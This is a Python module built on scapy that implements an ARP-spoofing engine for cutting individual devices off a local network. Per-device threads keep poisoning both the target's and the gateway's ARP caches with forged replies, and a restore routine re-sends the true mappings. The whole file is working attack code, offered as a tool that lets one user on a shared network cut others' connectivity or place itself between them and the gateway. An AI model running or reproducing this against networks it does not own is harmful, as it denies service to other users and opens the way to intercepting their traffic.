"""ARP-spoofing engine: cut/restore individual devices, with live counters.

Each cut device gets its own daemon thread that continuously poisons both the
target and the gateway. Stopping a device sends corrective ARP replies so its
connectivity is restored immediately instead of waiting for cache timeout.
"""
import threading

from device import Device
from scanner import BROADCAST, get_mac
from scapy.layers.l2 import ARP
from scapy.sendrecv import send

_INTERVAL = 2.0  # seconds between poison rounds


class Spoofer:
    def __init__(self, gateway_ip: str, gateway_mac: str | None, iface=None):
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac or BROADCAST
        self.iface = iface
        self._stops: dict[str, threading.Event] = {}
        self._threads: dict[str, threading.Thread] = {}

    def is_cutting(self, ip: str) -> bool:
        return ip in self._threads and self._threads[ip].is_alive()

    @property
    def active_count(self) -> int:
        return sum(1 for t in self._threads.values() if t.is_alive())

    def start(self, device: Device) -> bool:
        if not device.is_target or self.is_cutting(device.ip):
            return False
        stop = threading.Event()
        self._stops[device.ip] = stop
        t = threading.Thread(target=self._loop, args=(device, stop), daemon=True)
        self._threads[device.ip] = t
        device.status = 'cut'
        t.start()
        return True

    def stop(self, device: Device) -> bool:
        if device.ip not in self._stops:
            return False
        self._stops[device.ip].set()
        self._threads.pop(device.ip, None)
        self._stops.pop(device.ip, None)
        device.status = 'online'
        self._restore(device)
        return True

    def stop_all(self, devices: list[Device]) -> None:
        for d in list(devices):
            if d.ip in self._stops:
                self.stop(d)

    # -- internals ---------------------------------------------------------

    def _loop(self, device: Device, stop: threading.Event) -> None:
        while not stop.is_set():
            try:
                # Tell the target that we are the gateway.
                send(ARP(op=2, pdst=device.ip, hwdst=device.mac, psrc=self.gateway_ip),
                     verbose=False, iface=self.iface)
                # Tell the gateway that we are the target.
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=device.ip),
                     verbose=False, iface=self.iface)
                device.packets += 2
            except Exception:
                pass
            stop.wait(_INTERVAL)

    def _restore(self, device: Device) -> None:
        """Re-advertise the real MAC<->IP mappings to heal both caches."""
        target_mac = device.mac or get_mac(device.ip)
        if not target_mac or self.gateway_mac == BROADCAST:
            return
        for _ in range(5):
            send(ARP(op=2, pdst=device.ip, hwdst=target_mac,
                     psrc=self.gateway_ip, hwsrc=self.gateway_mac), verbose=False, iface=self.iface)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                     psrc=device.ip, hwsrc=target_mac), verbose=False, iface=self.iface)
